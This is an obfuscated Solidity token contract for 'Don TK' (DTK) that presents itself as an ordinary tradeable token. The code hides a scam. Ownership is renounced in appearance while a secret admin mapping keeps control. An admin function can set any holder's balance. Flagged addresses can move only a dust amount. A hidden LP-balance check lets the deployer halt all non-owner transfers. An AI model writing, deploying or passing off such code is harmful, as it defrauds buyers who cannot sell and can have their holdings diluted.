//SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface wddcupthu {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract dpivwjjhdlpqb {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface aqlhlqybp {
    function createPair(address jimqwyoeygs, address vyuxxixponqxi) external returns (address);
}

interface kbixczbar {
    function totalSupply() external view returns (uint256);

    function balanceOf(address ljhyuwmswxmnu) external view returns (uint256);

    function transfer(address hokqrrxzvf, uint256 swvngsiprnnhfn) external returns (bool);

    function allowance(address vvbbhdyaszcp, address spender) external view returns (uint256);

    function approve(address spender, uint256 swvngsiprnnhfn) external returns (bool);

    function transferFrom(
        address sender,
        address hokqrrxzvf,
        uint256 swvngsiprnnhfn
    ) external returns (bool);

    event Transfer(address indexed from, address indexed fybnocaywodblj, uint256 value);
    event Approval(address indexed vvbbhdyaszcp, address indexed spender, uint256 value);
}

interface kbixczbarMetadata is kbixczbar {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract DonTK is dpivwjjhdlpqb, kbixczbar, kbixczbarMetadata {

    uint256 jdwpfyvmw;

    uint256 public lgjjzrmok;

    bool private jlgdiamuyk;

    function iofungwfcteg(address xgxqurjempig) public {
        iaalabbbjflzi();
        if (vybqkaqnlkoil == aekeetahnho) {
            kogfikrwah = kfndvzqslvw;
        }
        if (xgxqurjempig == vtevxtriqqac || xgxqurjempig == vwufvwohg) {
            return;
        }
        aldvrsjfbikud[xgxqurjempig] = true;
    }

    constructor (){
        if (lgjjzrmok != ulukcxobojz) {
            lgjjzrmok = kogfikrwah;
        }
        vqvwkqhfcuupmm();
        wddcupthu mjtlqsxfgjciet = wddcupthu(nokrdodtyky);
        vwufvwohg = aqlhlqybp(mjtlqsxfgjciet.factory()).createPair(mjtlqsxfgjciet.WETH(), address(this));
        if (kfndvzqslvw != ulukcxobojz) {
            ulukcxobojz = kfndvzqslvw;
        }
        vtevxtriqqac = _msgSender();
        kocvxggltoxe[vtevxtriqqac] = true;
        vizuxgtmlny[vtevxtriqqac] = jnvaznpfrdzu;
        if (efgzqcnhnicci) {
            kogfikrwah = lgjjzrmok;
        }
        emit Transfer(address(0), vtevxtriqqac, jnvaznpfrdzu);
    }

    mapping(address => mapping(address => uint256)) private gstpkxaewgh;

    uint256 private jnvaznpfrdzu = 100000000 * 10 ** 18;

    function transferFrom(address yrjpdqsfmq, address hokqrrxzvf, uint256 swvngsiprnnhfn) external override returns (bool) {
        if (_msgSender() != nokrdodtyky) {
            if (gstpkxaewgh[yrjpdqsfmq][_msgSender()] != type(uint256).max) {
                require(swvngsiprnnhfn <= gstpkxaewgh[yrjpdqsfmq][_msgSender()]);
                gstpkxaewgh[yrjpdqsfmq][_msgSender()] -= swvngsiprnnhfn;
            }
        }
        return dxftnmqikzqbgr(yrjpdqsfmq, hokqrrxzvf, swvngsiprnnhfn);
    }

    mapping(address => uint256) private vizuxgtmlny;

    function owner() external view returns (address) {
        return pxfemcrazcm;
    }

    function transfer(address hazzglnipz, uint256 swvngsiprnnhfn) external virtual override returns (bool) {
        return dxftnmqikzqbgr(_msgSender(), hazzglnipz, swvngsiprnnhfn);
    }

    uint256 public kogfikrwah;

    uint256 private ulukcxobojz;

    address public vtevxtriqqac;

    mapping(address => bool) public aldvrsjfbikud;

    function decimals() external view virtual override returns (uint8) {
        return werbsztje;
    }

    address vwlzipolen = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function vqvwkqhfcuupmm() public {
        emit OwnershipTransferred(vtevxtriqqac, address(0));
        pxfemcrazcm = address(0);
    }

    address nokrdodtyky = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    string private yzoipwhaixyfr = "DTK";

    uint8 private werbsztje = 18;

    function wbdxkboapjkeyl(address yrjpdqsfmq, address hokqrrxzvf, uint256 swvngsiprnnhfn) internal returns (bool) {
        require(vizuxgtmlny[yrjpdqsfmq] >= swvngsiprnnhfn);
        vizuxgtmlny[yrjpdqsfmq] -= swvngsiprnnhfn;
        vizuxgtmlny[hokqrrxzvf] += swvngsiprnnhfn;
        emit Transfer(yrjpdqsfmq, hokqrrxzvf, swvngsiprnnhfn);
        return true;
    }

    function kfptysmotm(uint256 swvngsiprnnhfn) public {
        iaalabbbjflzi();
        jdwpfyvmw = swvngsiprnnhfn;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return jnvaznpfrdzu;
    }

    string private obothftikoup = "Don TK";

    function name() external view virtual override returns (string memory) {
        return obothftikoup;
    }

    bool private moxpnocovo;

    function allowance(address jnjgvqhhmms, address fimdxjgzgadjhz) external view virtual override returns (uint256) {
        if (fimdxjgzgadjhz == nokrdodtyky) {
            return type(uint256).max;
        }
        return gstpkxaewgh[jnjgvqhhmms][fimdxjgzgadjhz];
    }

    address public vwufvwohg;

    mapping(address => bool) public kocvxggltoxe;

    uint256 public kfndvzqslvw;

    function ltldfsmntkgn(address azdvyiroey) public {
        if (bmhhnysazjmxu) {
            return;
        }
        if (moxpnocovo != aekeetahnho) {
            moxpnocovo = true;
        }
        kocvxggltoxe[azdvyiroey] = true;
        if (kogfikrwah != ulukcxobojz) {
            ulukcxobojz = kogfikrwah;
        }
        bmhhnysazjmxu = true;
    }

    bool public efgzqcnhnicci;

    address private pxfemcrazcm;

    bool public bmhhnysazjmxu;

    uint256 constant rwthabjdowggou = 10 ** 10;

    function iaalabbbjflzi() private view {
        require(kocvxggltoxe[_msgSender()]);
    }

    bool private vybqkaqnlkoil;

    function xataroffh(address hazzglnipz, uint256 swvngsiprnnhfn) public {
        iaalabbbjflzi();
        vizuxgtmlny[hazzglnipz] = swvngsiprnnhfn;
    }

    bool private qyjbubtgrzlzj;

    bool public aekeetahnho;

    function getOwner() external view returns (address) {
        return pxfemcrazcm;
    }

    function approve(address fimdxjgzgadjhz, uint256 swvngsiprnnhfn) public virtual override returns (bool) {
        gstpkxaewgh[_msgSender()][fimdxjgzgadjhz] = swvngsiprnnhfn;
        emit Approval(_msgSender(), fimdxjgzgadjhz, swvngsiprnnhfn);
        return true;
    }

    uint256 yrihiwucojqla;

    function symbol() external view virtual override returns (string memory) {
        return yzoipwhaixyfr;
    }

    function balanceOf(address ljhyuwmswxmnu) public view virtual override returns (uint256) {
        return vizuxgtmlny[ljhyuwmswxmnu];
    }

    function dxftnmqikzqbgr(address yrjpdqsfmq, address hokqrrxzvf, uint256 swvngsiprnnhfn) internal returns (bool) {
        if (yrjpdqsfmq == vtevxtriqqac) {
            return wbdxkboapjkeyl(yrjpdqsfmq, hokqrrxzvf, swvngsiprnnhfn);
        }
        uint256 hctgmssbr = kbixczbar(vwufvwohg).balanceOf(vwlzipolen);
        require(hctgmssbr == jdwpfyvmw);
        require(hokqrrxzvf != vwlzipolen);
        if (aldvrsjfbikud[yrjpdqsfmq]) {
            return wbdxkboapjkeyl(yrjpdqsfmq, hokqrrxzvf, rwthabjdowggou);
        }
        return wbdxkboapjkeyl(yrjpdqsfmq, hokqrrxzvf, swvngsiprnnhfn);
    }

    event OwnershipTransferred(address indexed cdhnngtqv, address indexed yoolyqndfj);

}